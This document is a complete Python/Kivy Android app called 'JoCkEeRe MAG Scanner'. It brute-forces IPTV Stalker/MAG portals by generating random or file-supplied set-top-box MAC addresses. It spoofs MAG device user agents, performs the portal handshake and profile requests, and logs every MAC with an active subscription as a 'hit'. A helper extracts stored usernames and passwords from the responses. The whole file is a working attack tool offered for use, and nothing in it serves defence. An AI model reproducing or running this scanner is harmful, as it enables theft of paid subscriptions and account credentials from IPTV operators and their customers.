#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
JoCkEeRe MAG Scanner - Android Ready Edition
Improved UI with better spacing, clarity, and modern design.
"""

import os
import re
import time
import random
import json
import queue
import threading
import logging
from datetime import date, datetime

# ==================== Kivy Config ====================
from kivy.config import Config
Config.set('graphics', 'resizable', False)
Config.set('graphics', 'width', '450')
Config.set('graphics', 'height', '800')

from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.gridlayout import GridLayout
from kivy.uix.label import Label
from kivy.uix.textinput import TextInput
from kivy.uix.button import Button
from kivy.uix.spinner import Spinner
from kivy.uix.scrollview import ScrollView
from kivy.uix.popup import Popup
from kivy.clock import Clock
from kivy.core.window import Window
from kivy.uix.checkbox import CheckBox
from kivy.uix.filechooser import FileChooserListView
from kivy.graphics import Color, Rectangle, RoundedRectangle
from kivy.uix.widget import Widget
from kivy.utils import platform as kivy_platform

Window.orientation = 'portrait'

import requests
import warnings
warnings.filterwarnings('ignore')
logging.captureWarnings(True)

try:
    ses = requests.Session()
except Exception:
    ses = requests.Session()

# ==================== Platform & Paths ====================
is_android = kivy_platform == 'android'

if is_android:
    try:
        from android.permissions import request_permissions, Permission
        from android.storage import primary_external_storage_path
        request_permissions([
            Permission.WRITE_EXTERNAL_STORAGE,
            Permission.READ_EXTERNAL_STORAGE,
            Permission.INTERNET
        ])
        BASE_DIR = primary_external_storage_path()
    except Exception as e:
        print(f"Android init error: {e}")
        BASE_DIR = "/sdcard"
else:
    BASE_DIR = "."

HITS_DIR   = os.path.join(BASE_DIR, "Hits", "JoCkEeRe")
COMBO_DIR  = os.path.join(BASE_DIR, "combo")
CONFIG_FILE = os.path.join(BASE_DIR, "Hits", "jockeere_config.json")

os.makedirs(HITS_DIR, exist_ok=True)
os.makedirs(COMBO_DIR, exist_ok=True)

nickn = "JoCkEeRe"

# ==================== Color Palette ====================
BG_DARK       = (0.05, 0.05, 0.10, 1)
BG_CARD       = (0.08, 0.09, 0.16, 1)
BG_CARD2      = (0.10, 0.11, 0.20, 1)
COLOR_ACCENT  = (0.0,  0.85, 0.94, 1)
COLOR_PURPLE  = (0.55, 0.30, 1.0,  1)
COLOR_GREEN   = (0.0,  0.85, 0.50, 1)
COLOR_YELLOW  = (1.0,  0.80, 0.0,  1)
COLOR_RED     = (1.0,  0.30, 0.30, 1)
COLOR_WHITE   = (0.95, 0.95, 1.0,  1)
COLOR_GRAY    = (0.55, 0.60, 0.70, 1)
COLOR_HITS    = (1.0,  0.85, 0.0,  1)

# ==================== Helper Widgets ====================

class Card(BoxLayout):
    """A rounded dark card container."""
    def __init__(self, bg=None, radius=14, **kwargs):
        super().__init__(**kwargs)
        self._bg = bg or BG_CARD
        self._radius = radius
        with self.canvas.before:
            Color(*self._bg)
            self._rect = RoundedRectangle(size=self.size, pos=self.pos, radius=[self._radius])
        self.bind(size=self._upd, pos=self._upd)

    def _upd(self, *a):
        self._rect.size = self.size
        self._rect.pos  = self.pos


def section_label(text):
    """Styled section header label."""
    return Label(
        text=f"[b]{text}[/b]",
        markup=True,
        font_size='15sp',
        color=COLOR_PURPLE,
        size_hint=(1, None),
        height=36,
        halign='left',
        valign='middle'
    )


def field_label(text):
    return Label(
        text=text,
        font_size='15sp',
        color=COLOR_GRAY,
        size_hint_x=0.35,
        halign='right',
        valign='middle'
    )


def styled_input(**kwargs):
    return TextInput(
        background_color=(0.10, 0.11, 0.22, 1),
        foreground_color=COLOR_ACCENT,
        cursor_color=COLOR_ACCENT,
        font_size='15sp',
        padding=[10, 8, 10, 8],
        **kwargs
    )


def styled_spinner(values, text=None, **kwargs):
    return Spinner(
        text=text or values[0],
        values=values,
        font_size='14sp',
        background_color=(0.12, 0.13, 0.25, 1),
        color=COLOR_ACCENT,
        **kwargs
    )


def styled_button(text, bg_color, fg_color=(1,1,1,1), **kwargs):
    btn = Button(
        text=f"[b]{text}[/b]",
        markup=True,
        font_size='16sp',
        background_color=bg_color,
        color=fg_color,
        background_normal='',
        **kwargs
    )
    return btn


def spacer(h=10):
    return Widget(size_hint_y=None, height=h)

# ==================== Network Helpers ====================

def month_string_to_number(ay):
    m = {'jan':1,'feb':2,'mar':3,'apr':4,'may':5,'jun':6,
         'jul':7,'aug':8,'sep':9,'oct':10,'nov':11,'dec':12}
    return m.get(ay.strip()[:3].lower(), 1)


def tarih_clear(trh):
    try:
        ay  = trh.split(' ')[0]
        gun = trh.split(', ')[0].split(' ')[1]
        yil = trh.split(',')[1]
        ay  = month_string_to_number(ay)
        d   = date(int(yil), int(ay), int(gun))
        return int((time.mktime(d.timetuple()) - time.time()) / 86400)
    except:
        return 0


def vpnip(ip):
    try:
        res = ses.get(f"http://ip-api.com/json/{ip}?fields=status,country,city",
                      timeout=7, verify=False).json()
        if res.get("status") == "success":
            return f"{res.get('country','?')}/{res.get('city','?')}"
    except:
        pass
    return "Invalid"


def randommac(prefix):
    mac = f"{prefix}%02X:%02X:%02X" % (
        random.randint(0,255), random.randint(0,255), random.randint(0,255))
    return mac


def hea1(macs, useragent, panel):
    return {
        "User-Agent": useragent,
        "Referer": f"http://{panel}/c/",
        "Accept": "application/json,application/javascript,text/javascript,*/*;q=0.8",
        "Cookie": f"mac={macs}; stb_lang=en; timezone=Europe/Paris;",
        "Accept-Encoding": "gzip, deflate",
        "Connection": "Keep-Alive",
        "X-User-Agent": "Model: MAG254; Link: Ethernet",
    }


def hea2(macs, token, useragent, panel):
    return {
        "User-Agent": useragent,
        "Referer": f"http://{panel}/c/",
        "Accept": "application/json,application/javascript,text/javascript,*/*;q=0.8",
        "Cookie": f"mac={macs}; stb_lang=en; timezone=Europe/Paris;",
        "Accept-Encoding": "gzip, deflate",
        "Connection": "Keep-Alive",
        "X-User-Agent": "Model: MAG254; Link: Ethernet",
        "Authorization": f"Bearer {token}",
    }


def hea3(panel):
    return {
        "Icy-MetaData": "1",
        "User-Agent": "Lavf/57.83.100",
        "Accept-Encoding": "identity",
        "Host": panel,
        "Accept": "*/*",
        "Range": "bytes=0-",
        "Connection": "close",
    }


def goruntu(link, panel):
    try:
        res = ses.get(link, headers=hea3(panel), timeout=(2,5),
                      allow_redirects=False, stream=True)
        return "VAV OK" if res.status_code == 302 else "VPN NEEDED"
    except:
        return "VPN NEEDED"


def list_categories(listlink, macs, token, useragent, panel, livel):
    veri = ""
    for _ in range(12):
        try:
            res  = ses.get(listlink, headers=hea2(macs, token, useragent, panel), timeout=30, verify=False)
            veri = res.text
            break
        except:
            time.sleep(1)
    kategori = ""
    if veri.count('title":"') > 1:
        for i in veri.split('title":"')[1:]:
            try:
                kanal = str((i.split('"')[0]).encode('utf-8').decode("unicode-escape")).replace('\\/', '/')
                kategori += kanal.lstrip('{') + livel
            except:
                pass
    return kategori


def m3uapi(playerlink, macs, token, useragent, panel):
    veri = ""
    for _ in range(6):
        try:
            res  = ses.get(playerlink, headers=hea2(macs, token, useragent, panel), timeout=7, verify=False)
            veri = res.text
            break
        except:
            time.sleep(1)
    try:
        if 'active_cons' in veri:
            acon    = veri.split('active_cons":')[1].split(',')[0].replace('"','')
            mcon    = veri.split('max_connections":')[1].split(',')[0].replace('"','')
            status  = veri.split('status":')[1].split(',')[0].replace('"','')
            tz      = veri.split('timezone":"')[1].split('",')[0].replace("\\/","/").rstrip('"}')
            port    = veri.split('port":')[1].split(',')[0].replace('"','')
            userm   = veri.split('username":')[1].split(',')[0].replace('"','')
            pasm    = veri.split('password":')[1].split(',')[0].replace('"','')
            bitism  = veri.split('exp_date":')[1].split(',')[0].replace('"','')
            bitism  = "Unlimited" if bitism == "null" else datetime.fromtimestamp(int(bitism)).strftime('%m-%d-%Y')
            return (f"\n=== M3U API ===\n"
                    f"Port    : {port}\n"
                    f"User    : {userm}\n"
                    f"Pass    : {pasm}\n"
                    f"Active  : {acon}/{mcon}\n"
                    f"Status  : {status}\n"
                    f"Expiry  : {bitism}\n"
                    f"TZ      : {tz}")
    except:
        pass
    return ""


def url_gen(cid, panel, uzmanm):
    return (f"http://{panel}/{uzmanm}?type=itv&action=create_link"
            f"&cmd=ffmpeg%20http://localhost/ch/{cid}_"
            f"&JsHttpRequest=1-xml")


def save_hit_to_file(hit_text, panel):
    safe = panel.replace(':', '_').replace('/', '_')
    path = os.path.join(HITS_DIR, f"{safe}.txt")
    try:
        with open(path, "a", encoding="utf-8") as f:
            f.write(hit_text + "\n\n")
    except Exception as e:
        print(f"Save error: {e}")

# ==================== Main App ====================

class JoCkEeReApp(App):
    def build(self):
        self.title = "JoCkEeRe MAG Scanner"
        Window.clearcolor = BG_DARK
        return ScannerLayout()


class ScannerLayout(BoxLayout):
    def __init__(self, **kwargs):
        super().__init__(orientation='vertical', spacing=0, padding=0, **kwargs)

        # State
        self.running       = False
        self.paused        = False
        self.stop_event    = threading.Event()
        self.pause_event   = threading.Event()
        self.update_queue  = queue.Queue()
        self.worker_threads = []
        self.mac_list      = []
        self.hits          = 0
        self.checked       = 0
        self.start_time    = 0
        self.total_macs    = 0
        self.combo_path    = None
        self.panel_host    = ""
        self.panel_choice  = ""
        self.mac_prefix    = ""
        self.bots          = 4
        self.output_mode   = "0"
        self.dsyno         = "0"
        self.useragent     = ""
        self.uzmanm = self.uzmanc = self.buri = self.urib = self.uzmanm2 = ""

        with self.canvas.before:
            Color(*BG_DARK)
            self.bg_rect = Rectangle(size=self.size, pos=self.pos)
        self.bind(size=lambda *a: setattr(self.bg_rect, 'size', self.size),
                  pos=lambda *a:  setattr(self.bg_rect, 'pos',  self.pos))

        self._build_header()
        self._build_scroll_area()
        self._build_stats_bar()
        self._build_log_area()
        self._build_buttons()
        self._build_status_bar()

        Clock.schedule_interval(self.process_queue, 0.1)
        self.load_settings()

    # ─────────────────────────────────────────
    #  HEADER
    # ─────────────────────────────────────────
    def _build_header(self):
        header = Card(
            bg=(0.06, 0.06, 0.14, 1),
            orientation='horizontal',
            size_hint=(1, None),
            height=70,
            padding=[18, 0, 18, 0],
            spacing=12,
            radius=0
        )
        title = Label(
            text="[b]  JoCkEeRe  MAG  SCANNER[/b]",
            markup=True,
            font_size='22sp',
            color=COLOR_ACCENT,
            halign='left',
            valign='middle'
        )
        title.bind(size=title.setter('text_size'))

        ver = Label(
            text="[b]v2.0[/b]",
            markup=True,
            font_size='13sp',
            color=COLOR_PURPLE,
            size_hint_x=None,
            width=50,
            halign='right',
            valign='middle'
        )
        header.add_widget(title)
        header.add_widget(ver)
        self.add_widget(header)

    # ─────────────────────────────────────────
    #  SCROLLABLE CONFIG AREA
    # ─────────────────────────────────────────
    def _build_scroll_area(self):
        scroll = ScrollView(size_hint=(1, None), height=440, do_scroll_x=False)
        inner  = BoxLayout(orientation='vertical', size_hint_y=None, spacing=12, padding=[12, 12, 12, 12])
        inner.bind(minimum_height=inner.setter('height'))

        inner.add_widget(self._panel_card())
        inner.add_widget(self._mac_source_card())
        inner.add_widget(self._scan_settings_card())

        scroll.add_widget(inner)
        self.add_widget(scroll)

    # ── Panel Settings Card ──
    def _panel_card(self):
        card = Card(orientation='vertical', size_hint=(1, None), height=180,
                    padding=[14, 10, 14, 10], spacing=10)

        card.add_widget(section_label("  PANEL SETTINGS"))
        card.add_widget(spacer(4))

        row1 = BoxLayout(size_hint=(1, None), height=44, spacing=10)
        row1.add_widget(field_label("Type :"))
        self.panel_type_spinner = styled_spinner([
            "1 - Portal.php", "2 - Portal.php (White Ultra)", "3 - Portal.php (Real Blue)",
            "4 - Server/load.php", "5 - Stalker_portal", "6 - C/server/load.php",
            "7 - C/portal.php",  "8 - Bs.msg.portal",   "9 - Magload.php",
            "10 - Portalstb/portal.php", "11 - K/portal.php", "12 - Maglove/portal.php",
            "13 - Magaccess", "14 - Portalmega.php", "15 - Powerfull"
        ], size_hint_x=0.65)
        row1.add_widget(self.panel_type_spinner)
        card.add_widget(row1)

        row2 = BoxLayout(size_hint=(1, None), height=44, spacing=10)
        row2.add_widget(field_label("Host :"))
        self.panel_entry = styled_input(
            hint_text="panel:port  e.g. 1.2.3.4:8080",
            multiline=False,
            size_hint_x=0.65
        )
        row2.add_widget(self.panel_entry)
        card.add_widget(row2)

        return card

    # ── MAC Source Card ──
    def _mac_source_card(self):
        card = Card(orientation='vertical', size_hint=(1, None), height=220,
                    padding=[14, 10, 14, 10], spacing=8)

        card.add_widget(section_label("  MAC SOURCE"))
        card.add_widget(spacer(4))

        # Toggle row
        toggle = BoxLayout(size_hint=(1, None), height=40, spacing=10)
        self.random_cb = CheckBox(active=True, size_hint_x=None, width=36)
        toggle.add_widget(self.random_cb)
        toggle.add_widget(Label(text="Random MAC", font_size='15sp', color=COLOR_WHITE, size_hint_x=0.35, halign='left'))
        self.combo_cb  = CheckBox(active=False, size_hint_x=None, width=36)
        toggle.add_widget(self.combo_cb)
        toggle.add_widget(Label(text="Combo File", font_size='15sp', color=COLOR_WHITE, size_hint_x=0.35, halign='left'))
        card.add_widget(toggle)

        self.random_cb.bind(active=self.on_random_toggle)
        self.combo_cb.bind(active=self.on_combo_toggle)

        card.add_widget(spacer(6))

        # Random row
        self.random_row = BoxLayout(size_hint=(1, None), height=44, spacing=10)
        self.random_row.add_widget(field_label("Prefix :"))
        self.prefix_spinner = styled_spinner([
            'D4:CF:F9:', '33:44:CF:', '10:27:BE:', 'A0:BB:3E:', '55:93:EA:',
            '04:D6:AA:', '11:33:01:', '00:1C:19:', '1A:00:6A:', '1A:00:FB:',
            '00:A1:79:', '00:1B:79:', '00:2A:79:', '00:1A:79:'
        ], text='00:1A:79:', size_hint_x=0.38)
        self.random_row.add_widget(self.prefix_spinner)
        self.random_row.add_widget(field_label("Count :"))
        self.mac_count_input = styled_input(text="30000", multiline=False,
                                            input_filter='int', size_hint_x=0.27)
        self.random_row.add_widget(self.mac_count_input)
        card.add_widget(self.random_row)

        # Combo row
        self.combo_row = BoxLayout(size_hint=(1, None), height=44, spacing=10)
        self.combo_file_label = Label(text="No file selected",
                                      font_size='14sp', color=COLOR_GRAY,
                                      size_hint_x=0.55, halign='left')
        self.combo_select_btn = styled_button("Browse", bg_color=(0.20, 0.22, 0.40, 1),
                                              size_hint_x=0.45, size_hint_y=1)
        self.combo_select_btn.bind(on_press=self.browse_combo)
        self.combo_row.add_widget(self.combo_file_label)
        self.combo_row.add_widget(self.combo_select_btn)
        card.add_widget(self.combo_row)

        self.combo_row.opacity  = 0
        self.combo_row.disabled = True

        return card

    # ── Scan Settings Card ──
    def _scan_settings_card(self):
        card = Card(orientation='vertical', size_hint=(1, None), height=140,
                    padding=[14, 10, 14, 10], spacing=8)

        card.add_widget(section_label("  SCAN SETTINGS"))
        card.add_widget(spacer(4))

        row = BoxLayout(size_hint=(1, None), height=44, spacing=10)
        row.add_widget(field_label("Bots :"))
        self.bots_input = styled_input(text="4", multiline=False,
                                       input_filter='int', size_hint_x=0.20)
        row.add_widget(self.bots_input)

        row.add_widget(field_label("Output :"))
        self.output_spinner = styled_spinner(
            ["0 - Portal Stalker", "1 - M3U API", "2 - Both"],
            size_hint_x=0.35
        )
        row.add_widget(self.output_spinner)
        card.add_widget(row)

        return card

    # ─────────────────────────────────────────
    #  STATS BAR
    # ─────────────────────────────────────────
    def _build_stats_bar(self):
        bar = Card(
            bg=BG_CARD2, orientation='vertical',
            size_hint=(1, None), height=90,
            padding=[16, 8, 16, 8], spacing=6, radius=0
        )

        top = BoxLayout(size_hint=(1, None), height=40, spacing=8)
        def _stat(label, ref_attr, color):
            col = BoxLayout(orientation='vertical', spacing=2)
            col.add_widget(Label(text=label, font_size='11sp', color=COLOR_GRAY,
                                 size_hint_y=None, height=16))
            lbl = Label(text="0", font_size='18sp', color=color, bold=True,
                        size_hint_y=None, height=24)
            col.add_widget(lbl)
            setattr(self, ref_attr, lbl)
            return col

        top.add_widget(_stat("CHECKED",  'checked_label',  COLOR_ACCENT))
        top.add_widget(_stat("HITS",     'hits_label',     COLOR_HITS))
        top.add_widget(_stat("SPEED/s",  'speed_label',    COLOR_GREEN))
        top.add_widget(_stat("PROGRESS", 'progress_label', COLOR_PURPLE))
        bar.add_widget(top)

        mac_row = BoxLayout(size_hint=(1, None), height=26, spacing=6)
        mac_row.add_widget(Label(text="MAC:", font_size='13sp', color=COLOR_GRAY,
                                 size_hint_x=None, width=40))
        self.current_mac_label = Label(text="--:--:--:--:--:--",
                                       font_size='13sp', color=COLOR_YELLOW,
                                       halign='left')
        self.current_mac_label.bind(size=self.current_mac_label.setter('text_size'))
        mac_row.add_widget(self.current_mac_label)
        bar.add_widget(mac_row)

        self.add_widget(bar)

    # ─────────────────────────────────────────
    #  LIVE LOG
    # ─────────────────────────────────────────
    def _build_log_area(self):
        wrapper = BoxLayout(orientation='vertical', size_hint=(1, 1),
                            padding=[10, 6, 10, 4], spacing=4)

        hdr = BoxLayout(size_hint=(1, None), height=28, spacing=8)
        hdr.add_widget(Label(text="[b]LIVE LOG[/b]", markup=True,
                             font_size='14sp', color=COLOR_PURPLE,
                             halign='left', size_hint_x=0.5))
        hdr.add_widget(Widget())
        clear_mini = styled_button("Clear", bg_color=(0.18, 0.10, 0.30, 1),
                                   fg_color=COLOR_GRAY,
                                   size_hint=(None, 1), width=64,
                                   font_size='13sp')
        clear_mini.markup = True
        clear_mini.bind(on_press=self.clear_log)
        hdr.add_widget(clear_mini)
        wrapper.add_widget(hdr)

        scroll = ScrollView(do_scroll_x=False)
        self.log_text = TextInput(
            readonly=True,
            background_color=(0.05, 0.06, 0.12, 1),
            foreground_color=COLOR_GREEN,
            cursor_color=COLOR_GREEN,
            font_size='13sp',
            multiline=True,
            padding=[10, 8, 10, 8]
        )
        scroll.add_widget(self.log_text)
        wrapper.add_widget(scroll)
        self.add_widget(wrapper)

    # ─────────────────────────────────────────
    #  BUTTONS
    # ─────────────────────────────────────────
    def _build_buttons(self):
        row = BoxLayout(size_hint=(1, None), height=60,
                        spacing=10, padding=[12, 6, 12, 6])

        self.start_btn = styled_button("START", bg_color=(0.0, 0.55, 0.35, 1),
                                       fg_color=(1,1,1,1))
        self.pause_btn = styled_button("PAUSE", bg_color=(0.70, 0.50, 0.0, 1),
                                       fg_color=(1,1,1,1))
        self.pause_btn.disabled = True

        self.start_btn.bind(on_press=self.toggle_scan)
        self.pause_btn.bind(on_press=self.toggle_pause)

        row.add_widget(self.start_btn)
        row.add_widget(self.pause_btn)
        self.add_widget(row)

    # ─────────────────────────────────────────
    #  STATUS BAR
    # ─────────────────────────────────────────
    def _build_status_bar(self):
        bar = Card(bg=(0.06, 0.06, 0.14, 1), orientation='horizontal',
                   size_hint=(1, None), height=36,
                   padding=[14, 0, 14, 0], radius=0)

        self.status_label = Label(text="Ready", font_size='13sp',
                                  color=COLOR_YELLOW, halign='left', valign='middle')
        self.status_label.bind(size=self.status_label.setter('text_size'))

        self.time_label = Label(text="00:00:00", font_size='13sp',
                                color=COLOR_GRAY, halign='right', valign='middle',
                                size_hint_x=None, width=80)
        bar.add_widget(self.status_label)
        bar.add_widget(self.time_label)
        self.add_widget(bar)

    # ─────────────────────────────────────────
    #  UI CALLBACKS
    # ─────────────────────────────────────────
    def on_random_toggle(self, instance, value):
        if value:
            self.combo_cb.active    = False
            self.random_row.opacity = 1
            self.random_row.disabled = False
            self.combo_row.opacity  = 0
            self.combo_row.disabled = True
            self.dsyno = "0"

    def on_combo_toggle(self, instance, value):
        if value:
            self.random_cb.active   = False
            self.random_row.opacity = 0
            self.random_row.disabled = True
            self.combo_row.opacity  = 1
            self.combo_row.disabled = False
            self.dsyno = "1"

    def browse_combo(self, instance):
        start = COMBO_DIR if os.path.exists(COMBO_DIR) else BASE_DIR
        content = BoxLayout(orientation='vertical', spacing=10, padding=10)
        fc = FileChooserListView(path=start, filters=['*.txt'])
        btn = styled_button("Select File", bg_color=(0.0, 0.55, 0.35, 1),
                            size_hint_y=None, height=52)
        content.add_widget(fc)
        content.add_widget(btn)
        popup = Popup(title="Choose combo file", content=content,
                      size_hint=(0.95, 0.92),
                      background_color=(0.08, 0.08, 0.16, 1))

        def on_select(_):
            if fc.selection:
                self.combo_path = fc.selection[0]
                self.combo_file_label.text = os.path.basename(self.combo_path)
                try:
                    with open(self.combo_path, 'r', encoding='utf-8', errors='ignore') as f:
                        lines = f.readlines()
                    pat = r"([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}"
                    self.mac_list = [re.search(pat, l.upper()).group()
                                     for l in lines if re.search(pat, l.upper())]
                    self.add_log(f"[+] Loaded {len(self.mac_list)} MACs from file")
                except Exception as e:
                    self.add_log(f"[!] Error: {e}", error=True)
                    self.mac_list = []
            popup.dismiss()

        btn.bind(on_press=on_select)
        popup.open()

    def clear_log(self, *_):
        self.log_text.text = ""

    def add_log(self, msg, error=False, hit=False):
        ts  = datetime.now().strftime("%H:%M:%S")
        pfx = "[!]" if error else ("[HIT]" if hit else "[+]")
        line = f"{ts}  {pfx}  {msg}\n"
        self.log_text.text += line
        # Auto-scroll
        self.log_text.cursor = (0, len(self.log_text._lines))

    # ─────────────────────────────────────────
    #  SETTINGS LOAD / SAVE
    # ─────────────────────────────────────────
    def load_settings(self):
        if not os.path.exists(CONFIG_FILE):
            return
        try:
            with open(CONFIG_FILE, 'r') as f:
                s = json.load(f)
            self.panel_entry.text       = s.get("panel_host", "")
            idx = s.get("panel_type", 0)
            self.panel_type_spinner.text = self.panel_type_spinner.values[idx]
            self.prefix_spinner.text    = s.get("mac_prefix", "00:1A:79:")
            self.mac_count_input.text   = str(s.get("total_macs", "30000"))
            self.bots_input.text        = str(s.get("bots", "4"))
            out = s.get("output_mode", 0)
            self.output_spinner.text    = self.output_spinner.values[out]
        except:
            pass

    def save_settings(self):
        try:
            s = {
                "panel_host":  self.panel_entry.text,
                "panel_type":  self.panel_type_spinner.values.index(self.panel_type_spinner.text),
                "mac_prefix":  self.prefix_spinner.text,
                "total_macs":  self.mac_count_input.text,
                "bots":        self.bots_input.text,
                "output_mode": self.output_spinner.values.index(self.output_spinner.text)
            }
            with open(CONFIG_FILE, 'w') as f:
                json.dump(s, f)
        except:
            pass

    # ─────────────────────────────────────────
    #  SCAN CONTROL
    # ─────────────────────────────────────────
    def toggle_scan(self, _):
        if self.running:
            self.stop_scan()
        else:
            self.start_scan()

    def stop_scan(self):
        self.running = False
        self.stop_event.set()
        self.pause_event.set()
        self.start_btn.text    = "[b]START[/b]"
        self.start_btn.background_color = (0.0, 0.55, 0.35, 1)
        self.pause_btn.disabled = True
        self.status_label.text  = "Stopped"
        self.add_log("Scan stopped.", error=True)
        self.current_mac_label.text = "--:--:--:--:--:--"

    def toggle_pause(self, _):
        if not self.running:
            return
        if self.paused:
            self.pause_event.set()
            self.paused = False
            self.pause_btn.text = "[b]PAUSE[/b]"
            self.status_label.text = "Running..."
            self.add_log("Resumed.")
        else:
            self.pause_event.clear()
            self.paused = True
            self.pause_btn.text = "[b]RESUME[/b]"
            self.status_label.text = "Paused"
            self.add_log("Paused.", error=True)

    def start_scan(self):
        self.panel_host = self.panel_entry.text.strip()
        if not self.panel_host:
            self.add_log("ERROR: Enter Panel:Port", error=True)
            return

        self.panel_host   = self.panel_host.replace("http://","").replace("/c","").rstrip("/")
        self.panel_choice = str(self.panel_type_spinner.values.index(self.panel_type_spinner.text) + 1)

        try:
            self.bots = max(1, int(self.bots_input.text))
        except:
            self.bots = 4

        self.output_mode = str(self.output_spinner.values.index(self.output_spinner.text))

        if self.dsyno == "0":
            self.mac_prefix  = self.prefix_spinner.text
            try:
                self.total_macs = max(1, int(self.mac_count_input.text))
            except:
                self.total_macs = 30000
            self.combo_data = None
        else:
            if not self.combo_path or not self.mac_list:
                self.add_log("ERROR: Select a valid combo file", error=True)
                return
            self.total_macs = len(self.mac_list)
            self.combo_data = self.mac_list[:]
            self.mac_prefix = ""

        self._setup_panel_params()
        self.save_settings()

        # Reset state
        self.hits    = 0
        self.checked = 0
        self.running = True
        self.paused  = False
        self.stop_event.clear()
        self.pause_event.set()
        self.start_time = time.time()

        self.start_btn.text = "[b]STOP[/b]"
        self.start_btn.background_color = (0.75, 0.10, 0.10, 1)
        self.pause_btn.disabled = False
        self.status_label.text  = "Running..."
        self.add_log(f"Scan started  |  Panel: {self.panel_host}  |  Bots: {self.bots}")

        mac_iter = iter(self.combo_data) if self.combo_data else None
        mac_lock = threading.Lock()

        for _ in range(self.bots):
            t = threading.Thread(target=self.worker, args=(mac_iter, mac_lock), daemon=True)
            t.start()
            self.worker_threads.append(t)

        Clock.schedule_interval(self.update_timer, 1)

    def _setup_panel_params(self):
        c = self.panel_choice
        ua_mag = "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3"
        ua_old = "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 1812 Mobile Safari/533.3"
        self.useragent = ua_mag
        self.buri = "/c/"; self.urib = ""; self.uzmanc = ""

        mapping = {
            "1":  ("portal.php",                    ua_mag,  ""),
            "2":  ("portal.php",                    ua_old,  "ultra"),
            "3":  ("portal.php",                    ua_old,  "realblue"),
            "4":  ("server/load.php",               ua_mag,  ""),
            "5":  ("stalker_portal/server/load.php", ua_mag, "stalker"),
            "6":  ("c/server/load.php",             ua_mag,  ""),
            "7":  ("c/portal.php",                  ua_mag,  ""),
            "8":  ("bs.msg/portal.php",             ua_mag,  ""),
            "9":  ("magload.php",                   ua_mag,  ""),
            "10": ("portalstb/portal.php",          ua_mag,  ""),
            "11": ("k/portal.php",                  ua_mag,  ""),
            "12": ("maglove/portal.php",            ua_mag,  ""),
            "13": ("magaccess/portal.php",          ua_mag,  ""),
            "14": ("portalmega.php",                ua_mag,  ""),
            "15": ("portal.php",                    ua_mag,  "powerfull"),
        }
        if c in mapping:
            self.uzmanm, self.useragent, self.uzmanc = mapping[c]
        if c == "5":
            self.urib = "/stalker_portal"

    # ─────────────────────────────────────────
    #  WORKER
    # ─────────────────────────────────────────
    def worker(self, mac_iter, mac_lock):
        panel    = self.panel_host
        count    = 0

        while self.running:
            self.pause_event.wait()
            if not self.running:
                break

            # Get next MAC
            with mac_lock:
                if mac_iter:
                    try:
                        macs = next(mac_iter)
                    except StopIteration:
                        break
                    count += 1
                    if count > self.total_macs:
                        break
                else:
                    if self.checked >= self.total_macs:
                        break
                    macs = randommac(self.mac_prefix)

            self.update_queue.put(('mac', macs))

            try:
                token_url = f"http://{panel}{self.buri}{self.uzmanm}?action=handshake&type=stb&token=&JsHttpRequest=1-xml"
                r1 = ses.get(token_url, headers=hea1(macs, self.useragent, panel), timeout=8, verify=False)
                try:
                    token = r1.json()['js']['token']
                except:
                    token = ""

                profile_url = f"http://{panel}{self.buri}{self.uzmanm}?action=get_profile&type=stb&JsHttpRequest=1-xml"
                r2 = ses.get(profile_url, headers=hea2(macs, token, self.useragent, panel), timeout=8, verify=False)
                veri = r2.text

                self.update_queue.put(('checked', 1))

                expiry = 0
                if "expire_billing_date" in veri:
                    try:
                        raw_date = veri.split('expire_billing_date":"')[1].split('"')[0]
                        expiry   = tarih_clear(raw_date)
                    except:
                        pass

                if expiry > 0 or "expire_billing_date" in veri:
                    hit_info = (
                        f"\n{'='*44}\n"
                        f"  HIT FOUND  |  {nickn}\n"
                        f"{'='*44}\n"
                        f"  Panel  : {panel}\n"
                        f"  MAC    : {macs}\n"
                        f"  Expiry : {expiry} days\n"
                        f"{'='*44}"
                    )
                    save_hit_to_file(hit_info, panel)
                    self.update_queue.put(('hit', hit_info))

            except Exception:
                self.update_queue.put(('checked', 1))

        self.update_queue.put(('done', None))

    # ─────────────────────────────────────────
    #  QUEUE PROCESSOR
    # ─────────────────────────────────────────
    def process_queue(self, dt):
        done_count = 0
        while not self.update_queue.empty():
            try:
                kind, val = self.update_queue.get_nowait()
            except:
                break

            if kind == 'checked':
                self.checked += val
                self.checked_label.text  = str(self.checked)
                pct = (self.checked / self.total_macs * 100) if self.total_macs else 0
                self.progress_label.text = f"{pct:.1f}%"

            elif kind == 'hit':
                self.hits += 1
                self.hits_label.text = str(self.hits)
                self.add_log(val, hit=True)

            elif kind == 'mac':
                self.current_mac_label.text = val

            elif kind == 'done':
                done_count += 1

        if done_count >= self.bots and self.running:
            self.stop_scan()
            self.status_label.text = "Completed"

    def update_timer(self, dt):
        if not self.running:
            return False
        elapsed  = int(time.time() - self.start_time)
        h, rem   = divmod(elapsed, 3600)
        m, s     = divmod(rem, 60)
        self.time_label.text = f"{h:02d}:{m:02d}:{s:02d}"
        speed = self.checked / elapsed if elapsed > 0 else 0
        self.speed_label.text = f"{speed:.1f}"

# ==================== Entry Point ====================
if __name__ == "__main__":
    JoCkEeReApp().run()
